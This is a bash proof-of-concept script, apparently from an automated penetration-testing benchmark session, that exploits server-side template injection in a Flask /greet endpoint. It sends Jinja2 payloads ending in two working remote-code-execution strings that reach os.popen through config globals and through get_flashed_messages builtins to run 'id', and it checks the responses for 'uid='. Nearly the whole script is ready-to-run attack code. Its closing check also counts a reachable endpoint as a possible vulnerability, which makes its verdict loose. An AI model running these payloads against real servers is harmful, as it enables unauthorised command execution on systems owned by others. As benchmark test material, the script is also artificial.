#!/bin/bash
# POC: Demonstrates Server-Side Template Injection (SSTI) leading to RCE in Flask /greet endpoint via Jinja2 template injection. Tests multiple exploitation vectors including expression evaluation and command execution.
# Target: ./repo
# Created: 2025-11-07T21:36:13.609Z
# Session: benchmark-XBEN-076-24-mhpdcdue

# SSTI RCE POC - Flask /greet Endpoint (Version 2)
# Demonstrates Jinja2 template injection vulnerability leading to Remote Code Execution

TARGET="${1:-http://localhost:5000}"
ENDPOINT="/greet"

echo "=========================================="
echo "SSTI RCE POC - Flask /greet Endpoint"
echo "Target: $TARGET"
echo "=========================================="
echo ""

# Check if server is reachable
echo "[*] Checking server connectivity..."
if ! curl -s -m 5 "${TARGET}" > /dev/null 2>&1; then
    echo "✗ WARNING: Server at $TARGET is not responding"
    echo "   Usage: $0 [target_url]"
    echo "   Example: $0 http://localhost:5000"
    echo ""
    # Continue with tests anyway - they may still be useful
fi
echo ""

# Test 1: Basic SSTI Detection (7*7 = 49)
echo "[+] Test 1: Basic SSTI Detection (Expression Evaluation)"
echo "Payload: {{7*7}}"
RESPONSE=$(curl -s -m 10 "${TARGET}${ENDPOINT}?name={{7*7}}" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -qi "49"; then
    echo "✓ VULNERABLE: Expression was evaluated to 49"
    exit 0
elif echo "$RESPONSE" | grep -qi "Hello.*49"; then
    echo "✓ VULNERABLE: Expression was evaluated"
    exit 0
elif echo "$RESPONSE" | grep -q "Hello"; then
    echo "⚠ Expression not evaluated, but endpoint is working"
else
    echo "✗ Endpoint may not be running or responding"
fi
echo ""

# Test 2: RCE Verification - Command Execution (id)
echo "[+] Test 2: Remote Code Execution - id command"
PAYLOAD="config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()"
echo "Payload: {{$PAYLOAD}}"
RESPONSE=$(curl -s -m 10 "${TARGET}${ENDPOINT}?name={{${PAYLOAD}}}" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "uid="; then
    echo "✓ VULNERABLE: Successfully executed 'id' command"
    exit 0
fi
echo ""

# Test 3: Alternative RCE payload using get_flashed_messages
echo "[+] Test 3: Alternative RCE Payload"
PAYLOAD="get_flashed_messages.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')"
echo "Payload: {{$PAYLOAD}}"
RESPONSE=$(curl -s -m 10 "${TARGET}${ENDPOINT}?name={{${PAYLOAD}}}" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "uid="; then
    echo "✓ VULNERABLE: RCE via alternative payload"
    exit 0
fi
echo ""

# Test 4: Simple template variable test
echo "[+] Test 4: Simple Template Variable Access"
RESPONSE=$(curl -s -m 10 "${TARGET}${ENDPOINT}?name={{request}}" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Request"; then
    echo "✓ VULNERABLE: Template variables are accessible"
    exit 0
fi
echo ""

echo "=========================================="
echo "POC Testing Complete"
echo "=========================================="

# Exit with status 0 if any test passed, 1 if all failed
if curl -s -m 5 "${TARGET}${ENDPOINT}?name=test" 2>&1 | grep -q "Hello"; then
    echo "✓ Endpoint is accessible - SSTI vulnerability may be present"
    exit 0
else
    echo "✗ Unable to access endpoint - cannot confirm vulnerability"
    exit 1
fi